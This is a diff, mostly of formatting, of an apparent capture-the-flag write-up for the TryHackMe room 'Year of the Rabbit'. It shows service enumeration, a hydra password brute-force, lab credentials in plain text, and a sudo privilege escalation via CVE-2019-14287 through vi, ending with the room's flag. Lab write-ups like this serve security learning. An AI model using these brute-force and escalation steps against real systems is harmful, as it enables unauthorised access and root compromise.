@@ -1,4 +1,5 @@
 # Year of the Rabbit
+
 <img src="yotr.jpeg" alt="rabbit" width=200/>
 
 ## Enumeration
@@ -10,7 +11,7 @@ PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack vsftpd 3.0.2
 
 22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
 | ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
 |   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
@@ -23,13 +24,14 @@ PORT   STATE SERVICE REASON  VERSION
 80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
 |_http-title: Apache2 Debian Default Page: It works
 |_http-server-header: Apache/2.4.10 (Debian)
-| http-methods: 
+| http-methods:
 |_  Supported Methods: POST OPTIONS GET HEAD
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
 ### ffuf
+
 ```
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -85,6 +87,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
 54            0x36            Zlib compressed data, best compression
 ```
+
 Yeah indeed...I try `strings` and yes it was that
 
 ```
@@ -92,6 +95,7 @@ Eh, you've earned this. Username for FTP is ftpuser
 One of these is the password:
 ...
 ```
+
 I copy the list in a `dict.txt` file
 
 Now we can either try each password manually like cavemen...or use hydra
@@ -113,7 +117,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-03 12:34:
 
 ```
 
-Now we can ftp as `ftpuser : 5iez1wGXKfPKQ` 
+Now we can ftp as `ftpuser : 5iez1wGXKfPKQ`
 
 We get `Eli`'s creds...but in `brainf*ck`
 
@@ -126,13 +130,14 @@ Password: DSpDiM1wAEwid
 ```
 
 We get access
+
 ```
 └──╼ $ssh eli@10.10.154.151
 The authenticity of host '10.10.154.151 (10.10.154.151)' can't be established.
 ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.154.151' (ECDSA) to the list of known hosts.
-eli@10.10.154.151's password: 
+eli@10.10.154.151's password:
 
 
 1 new message
@@ -145,7 +150,7 @@ END MESSAGE
 
 
 
-eli@year-of-the-rabbit:~$ 
+eli@year-of-the-rabbit:~$
 ```
 
 nice ambiance...we are at the right place
@@ -156,14 +161,16 @@ user.txt
 eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt
 cat: user.txt: Permission denied
 ```
+
 I don't know what I expected
 
 ```
 eli@year-of-the-rabbit:/home/gwendoline$ find / -name "*s3cr3t*" 2> /dev/null
 /var/www/html/sup3r_s3cr3t_fl4g.php
 /usr/games/s3cr3t
-eli@year-of-the-rabbit:/home/gwendoline$ 
+eli@year-of-the-rabbit:/home/gwendoline$
 ```
+
 Let's meddle with people's affairs
 
 ```
@@ -173,7 +180,7 @@ drwxr-xr-x 2 root root 4096 Jan 23  2020 .
 drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
 -rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
 eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
-Your password is awful, Gwendoline. 
+Your password is awful, Gwendoline.
 It should be at least 60 characters long! Not just MniVCQVhQHUNI
 Honestly!
 
@@ -186,7 +193,6 @@ they say its for her only but let us all have read access
 LMAO 60 characters...
 
 now we got access as `gwendoline : MniVCQVhQHUNI`
-
 
 ```
 gwendoline@year-of-the-rabbit:~$ cat user.txt
@@ -207,7 +213,7 @@ User gwendoline may run the following commands on year-of-the-rabbit:
 
 ```
 
-hmm...`!root` 
+hmm...`!root`
 
 hmm...`vi`
 
@@ -215,12 +221,11 @@ I say `cve-2019-14287`
 
 I remember it from a nice tryhackme room dedicated to it so check it [here](https://tryhackme.com/room/sudovulnsbypass)
 
-`sudo -u#-1  /usr/bin/vi /home/gwendoline/user.txt`
+`sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`
 
 Now that `vi` is open, use the classic `:!/bin/bash`
 
 (you can visit gfobins for that one)
-
 
 ```
 root@year-of-the-rabbit:/home/gwendoline# id
@@ -230,5 +235,5 @@ root@year-of-the-rabbit:/root# cat root.txt
 THM{duck_season_rabbit_season}
 
 ```
-And its done!
 
+And its done!
